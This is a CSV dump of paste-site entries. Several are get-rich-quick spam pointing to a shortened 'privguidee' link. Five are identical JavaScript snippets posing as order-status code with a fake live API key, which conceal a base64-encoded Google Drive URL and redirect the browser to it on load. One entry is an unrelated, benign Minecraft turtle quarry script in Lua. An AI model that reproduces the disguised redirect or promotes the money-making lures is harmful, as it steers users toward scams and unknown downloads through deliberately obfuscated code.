id,title,username,language,date,content
p1A8ejWN,Make $1000 15-MINUTES (BEGINNER) XU,nandang74,JavaScript,Tuesday 22nd of April 2025 07:08:36 AM CDT," 
Pdf https://tinyurl.com/privguidee


srlleZWOil
"
mX7Q9wCq,Products.js,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 07:06:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38421/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4cD8WDRM,EARN $900 INSTANTLY 2025⭐ QA,nandang74,JavaScript,Tuesday 22nd of April 2025 06:59:22 AM CDT," 
Pdf https://tinyurl.com/privguidee


0gqZrBXeGS
"
n7yLAeFN,Order.js,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 06:51:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05962/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BfmMMjVe,Make $1000 15-MINUTES  (BEGINNER) GM,dthj9,JavaScript,Tuesday 22nd of April 2025 06:49:56 AM CDT," 
Pdf https://tinyurl.com/privguidee


qGGgSKvxSt
"
ZRJZsj77,EARN $900 INSTANTLY 2025⭐ QA,chett,JavaScript,Tuesday 22nd of April 2025 06:40:18 AM CDT," 
Pdf https://tinyurl.com/privguidee


fxtSQdI4jA
"
V2DQVX6R,Market.js,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 06:35:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/95450/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MCTLzmEZ,Mining Turtle Intelligent Quarry,officialVoice,Lua,Tuesday 22nd of April 2025 06:35:49 AM CDT,"io.write(""Length of the side example: 5 = 5x5 "")
local size = tonumber(read())

io.write(""Start Y-Level (e.g. 64): "")
local currentHeight = tonumber(read())
local startY = currentHeight

local targetHeight = -30



-- Fläche vorwärts graben
local function digLayerForward()
    for row = 1, size do
        for col = 1, size - 1 do
            turtle.dig()
            turtle.forward()
        end
        if row < size then
            if row % 2 == 1 then
                turtle.turnRight()
                turtle.dig()
                turtle.forward()
                turtle.turnRight()
            else
                turtle.turnLeft()
                turtle.dig()
                turtle.forward()
                turtle.turnLeft()
            end
        end
    end
end

-- Fläche rückwärts graben
local function digLayerBackward(odd)
  if odd == true then
      for row = 1, size do
          for col = 1, size - 1 do
              turtle.dig()
              turtle.forward()
          end
          if row < size then
              if row % 2 == 1 then
                  turtle.turnRight()
                  turtle.dig()
                  turtle.forward()
                  turtle.turnRight()
              else
                  turtle.turnLeft()
                  turtle.dig()
                  turtle.forward()
                  turtle.turnLeft()
              end
          end
      end
  else
      for row = 1, size do
          for col = 1, size - 1 do
              turtle.dig()
              turtle.forward()
          end
          if row < size then
              if row % 2 == 1 then
                  turtle.turnLeft()
                  turtle.dig()
                  turtle.forward()
                  turtle.turnLeft()
              else
                  turtle.turnRight()
                  turtle.dig()
                  turtle.forward()
                  turtle.turnRight()
              end
          end
      end
  end
end

local unwanted = { cobblestone=true, dirt=true, grass=true }
local function cleanupInventory()
  for i=1,16 do
    local d = turtle.getItemDetail(i)
    if d and unwanted[d.name:match("".+:(.+)"")] then
      turtle.select(i); turtle.drop()
    end
  end
  turtle.select(1)
end


local function isInventoryFull()
    cleanupInventory()
    local cnt=0
    for i=1,16 do cnt=cnt + turtle.getItemCount(i) end
    print(""Inventar: "" .. cnt)
    return cnt >= 15
end

local function goHomeAndBack()
    local layer = (startY - currentHeight) + 1

    -- nach oben zur Startposition (bei der Kiste)
    while turtle.detectUp() do turtle.digUp(); sleep(0.2) end
    while currentHeight < startY do
        turtle.up()
        currentHeight = currentHeight + 1
    end

    -- Kiste ist direkt hinter der Turtle
    turtle.turnLeft()
    turtle.turnLeft()

    -- Items droppen
    for i = 2, 16 do
        turtle.select(i)
        turtle.drop()
    end
    turtle.select(1)

    turtle.turnLeft()
    turtle.turnLeft()

    -- zurück auf das alte Y-Level
    while turtle.detectDown() do turtle.digDown(); sleep(0.2) end
    while currentHeight > (startY - layer + 1) do
        turtle.down()
        currentHeight = currentHeight - 1
    end
end



local function moveCoalToSlot1()
    turtle.select(1)
    for i=2,16 do
      local it = turtle.getItemDetail(i)
      if it and it.name==""minecraft:coal"" then
        turtle.transferTo(1, turtle.getItemCount(i))
        break
      end
    end
    turtle.select(1)
end
  
local function fuelCheck()
    moveCoalToSlot1()
    turtle.select(1)
    local d = turtle.getItemDetail()
    if d and d.name==""minecraft:coal"" then
      turtle.refuel(1); return
    else
        print(""No Coal"")
    end
end



-- Hauptloop
while currentHeight > targetHeight do
    if isInventoryFull() then
        goHomeAndBack()
    end
    digLayerForward()
    turtle.turnLeft()
    turtle.turnLeft()
    fuelCheck()
    while turtle.detectDown() do
      turtle.digDown()
      sleep(0.4)
    end
    if turtle.down() then
      currentHeight = currentHeight - 1
      print(""Aktuelle Höhe: "" .. currentHeight)
    else
      print(""Konnte nicht nach unten."")
      break -- ✅ jetzt korrekt innerhalb der while-Schleife
    end
    digLayerBackward(size % 2 == 1)
    turtle.turnLeft()
    turtle.turnLeft()
    while turtle.detectDown() do
      turtle.digDown()
      sleep(0.4)
    end
    if turtle.down() then
      currentHeight = currentHeight - 1
      print(""Aktuelle Höhe: "" .. currentHeight)
    else
      print(""Konnte nicht nach unten."")
      break -- ✅ jetzt korrekt innerhalb der while-Schleife
    end

    -- nach unten graben
end

print(""Fertig!"")"
ZkGzupCY,Make $1000 15-MINUTES (BEGINNER) XU,Ashninja12334,JavaScript,Tuesday 22nd of April 2025 06:30:09 AM CDT," 
Pdf https://tinyurl.com/privguidee


zSK9NW7oVS
"
qgVRErdd,Untitled,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 06:20:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42661/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
